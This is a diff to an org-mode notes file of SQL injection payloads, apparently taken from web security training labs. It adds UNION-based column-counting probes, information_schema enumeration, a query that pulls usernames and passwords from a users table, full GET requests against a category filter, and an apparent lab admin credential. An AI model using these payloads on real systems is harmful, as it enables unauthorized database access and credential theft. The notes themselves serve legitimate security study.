@@ -1,4 +1,20 @@
+-*- org-emphasis-alist: (("*" bold) ("/" italic) ("_" underline) ("=" org-verbatim verbatim) ("~" org-code verbatim) ("+" (:strike-through nil))); -*-
 * SQL injection payloads
+* breaking/detection
+'
+'OR+1=1
+* determine-number-of-colums
+'+UNION+SELECT+NULL--
+'+UNION+SELECT+NULL,NULL--
+'+UNION+SELECT+NULL,NULL,NULL--
+'+UNION+SELECT+NULL,NULL,NULL,NULL--
+'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL--
+'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL--
+'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+* text-colums
+'+UNION+SELECT+'a'--
+GET /filter?category=Gifts'+UNION+SELECT+NULL-- HTTP/1.1
+* 
 ** LAB SQL injection UNION attack, determining the number of columns returned by the query
 '+ORDER+BY+1--
 '+ORDER+BY+2--
@@ -10,3 +26,14 @@
 ** LAB SQL injection UNION attack, finding a column containing text
 ** LAB SQL injection UNION attack, retrieving data from other tables
 '+UNION+SELECT+'text','text'--
+'+UNION+SELECT+table_name,column_name+FROM+information_schema.columns--
+
+'+UNION+SELECT+username+||+'~'+||+password+FROM+users--
+username+||+'~'+||+password+FROM+users--
+
+administrator~148sst
+
+
+GET /filter?category=Lifestyle'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users-- HTTP/1.1
+
+select john from users 
